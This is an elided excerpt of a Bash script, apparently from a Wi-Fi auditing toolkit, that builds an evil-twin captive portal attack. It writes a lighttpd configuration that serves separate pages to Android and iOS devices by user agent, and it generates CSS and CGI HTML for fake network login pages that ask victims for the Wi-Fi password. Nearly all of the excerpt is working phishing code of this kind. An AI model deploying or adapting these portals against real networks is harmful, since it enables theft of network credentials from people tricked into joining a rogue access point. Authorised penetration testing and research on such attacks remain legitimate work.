...
function clean_tmpfiles() {
	...
	rm -rf "${tmpdir}dos_pm"* > /dev/null 2>&1
	rm -rf "${tmpdir}${channelfile}" > /dev/null 2>&1
	rm -rf "${tmpdir}explorewifi.txt" > /dev/null 2>&1
}
...
function exec_et_captive_portal_attack() {
	...
	mkdir "${tmpdir}${webdir}android/" > /dev/null 2>&1
	mkdir "${tmpdir}${webdir}ios/" > /dev/null 2>&1
	...
	set_webserver_config2
	set_captive_portal_page_ios
	set_captive_portal_page_android
	launch_webserver
	write_et_processes
...
function set_webserver_config2() {
	...
	{
	echo -e "server.document-root = \"${tmpdir}${webdir}android/\"\n"
	echo -e "server.modules = ("
	echo -e "\"mod_auth\","
	echo -e "\"mod_cgi\","
	echo -e "\"mod_redirect\","
	...
	echo -e "url.redirect-code = 302"
	echo -e "}"
	echo -e "\$HTTP[\"useragent\"] =~ \"(Android)\" {"
    echo -e "server.document-root = \"${tmpdir}${webdir}android/\""
    echo -e "}"
	echo -e "\$HTTP[\"useragent\"] =~ \"(iPhone|iPad|iPod)\" {"
    echo -e "server.document-root = \"${tmpdir}${webdir}ios/\""
    echo -e "}"
	echo -e "server.port = ${www_port}\n"
	echo -e "index-file.names = ( \"${indexfile}\" )\n"
	echo -e "server.error-handler-404 = \"/\"\n"
...
#Create captive portal files. Cgi bash scripts, css and js file
function set_captive_portal_page_ios() {
	...
	echo -e "body * {"
	echo -e "\tbox-sizing: border-box;"
	echo -e "\tfont-family: Arial, sans-serif;"
	echo -e "}\n"
	echo -e  "form {"
	...
	echo -e "\ttop: 25%;"
	echo -e "\tright: 0;"
	echo -e "\tfont-weight: 600;"
	echo -e "\tcolor: #1602c7;"
	echo -e "\tborder-radius: 5px;"
	echo -e "\tcursor: pointer;"
	echo -e "\theight: 30px;"
	echo -e "\tborder: none;"
	echo -e "\tfont-size: 14px;"
	echo -e "}\n"
	echo -e ".content {"
	echo -e "\twidth: 100%;"
	echo -e "\theight: 100vh;"
	echo -e "\tbackground-color: #ededed;"
	echo -e "\tpadding: 20px;"
	echo -e "\tborder-radius: 15px;"
	echo -e "\tcolor: #000000;"
	echo -e "}\n"
	echo -e ".title {"
	echo -e "\ttext-align: left;"
	echo -e "\tmargin-bottom: 15px;"
	echo -e "}\n"
	echo -e "label {"
	echo -e "\tposition: relative;"
	...
	echo -e "\tleft: 0;"
	echo -e "\ttop: 25%;"
	echo -e "\tpadding-left: 20px;"
	echo -e "}"
	echo -e "\n"
	echo -e "#password {"
	echo -e "\tmax-width: 100%;"
	echo -e "\theight: 30px;"
	echo -e "\tborder: none;" 
	echo -e "\tpadding: 18px;"
	echo -e "\tmargin-left: 90px;"
	echo -e "}\n"
	echo -e "#password:focus-visible {"
	echo -e "\toutline: none;"
	echo -e "}\n"
	echo -e ".button:hover {"
	echo -e "\topacity: .3;"
	...
	echo -e "echo -e '\t\t\t<form method=\"post\" id=\"loginform\" name=\"loginform\" action=\"check.htm\">'"
	echo -e "echo -e '\t\t\t\t${captive_portal_logo}<div class=\"title\">'"
	echo -e "echo -e '\t\t\t\t\t<p class=\"head-title\"> ${et_misc_texts[${captive_portal_language},9]} ${essid//[\`\']/}</p>'"
	echo -e "echo -e '\t\t\t\t\t<p class=\"bold\">Enter password</p>'"
	echo -e "echo -e '\t\t\t\t<input class=\"button\" id=\"formbutton\" type=\"button\" value=\"Join\"/>'"
	echo -e "echo -e '\t\t\t\t</div>'"
	echo -e "echo -e '\t\t\t\t<p>${et_misc_texts[${captive_portal_language},10]}</p>'"
	echo -e "echo -e '\t\t\t\t<label>'"
	echo -e "echo -e '\t\t\t\t<span>Password</span>'"	
	echo -e "echo -e '\t\t\t\t\t<input id=\"password\" type=\"password\" name=\"password\" maxlength=\"63\" size=\"20\"/><br/>'"
	echo -e "echo -e '\t\t\t\t</label>'"
	echo -e "echo -e '\t\t\t</form>'"
	echo -e "echo -e '\t\t</div>'"
	echo -e "echo -e '\t</body>'"
	echo -e "echo -e '</html>'"
	echo -e "exit 0"
	} >> "${tmpdir}${webdir}ios/${indexfile}"

	exec 4>"${tmpdir}${webdir}ios/${checkfile}"
...
#Create captive portal files. Cgi bash scripts, css and js file
function set_captive_portal_page_android() {
	...
	echo -e "}\n"
	echo -e  ".background {"
  	echo -e  "\tbackground-color: #414141;"
	echo -e  "}\n"
	echo -e ".button {"
	echo -e "\tposition: absolute;"
	echo -e "\tright: 0;"
	...
	echo -e "\theight: 30px;"
	echo -e "\tborder: none;"
	echo -e "\tborder-bottom: 2px solid #048e5b;;"
	echo -e "\tpadding: 18px;"
	echo -e "\tbackground-color: #414141;"
	echo -e "\tcolor: #fff;"
	echo -e "}\n"
	...
	echo -e "#showpass {"
	echo -e "\tvertical-align: top;"
	echo -e "\taccent-color: #414141;"
	echo -e "\tborder: none;"
	echo -e "}\n"
	} >> "${tmpdir}${webdir}android/${cssfile}"
	...
	echo -e "echo -e '\t</head>'"
	echo -e "echo -e '\t<body>'"
	echo -e "echo -e '\t\t<div class=\"content background\">'"
	echo -e "echo -e '\t\t\t<form method=\"post\" id=\"loginform\" name=\"loginform\" action=\"check.htm\">'"
	echo -e "echo -e '\t\t\t\t${captive_portal_logo}<div class=\"title\">'"
	echo -e "echo -e '\t\t\t\t\t<p class=\"bold\">${et_misc_texts[${captive_portal_language},9]} ${essid//[\`\']/}</p>'"
	echo -e "echo -e '\t\t\t\t\t<p class=\"head-title\">Enter password</p>'"
	echo -e "echo -e '\t\t\t\t</div>'"
	echo -e "echo -e '\t\t\t\t<label>'"
	echo -e "echo -e '\t\t\t\t\t<input id=\"password\" class=\"background\" type=\"password\" name=\"password\" maxlength=\"63\" size=\"20\"/><br/>'"
	echo -e "echo -e '\t\t\t\t\t<p><input type=\"checkbox\" id=\"showpass\"/> Show password</p>'"
	echo -e "echo -e '\t\t\t\t\t<input class=\"button background\" id=\"formbutton\" type=\"button\" value=\"${et_misc_texts[${captive_portal_language},28]}\"/>'"
	echo -e "echo -e '\t\t\t\t</label>'"
	echo -e "echo -e '\t\t\t</form>'"
	echo -e "echo -e '\t\t</div>'"
	echo -e "echo -e '\t</body>'"
	echo -e "echo -e '</html>'"
	echo -e "exit 0"
	} >> "${tmpdir}${webdir}android/${indexfile}"

	exec 4>"${tmpdir}${webdir}android/${checkfile}"
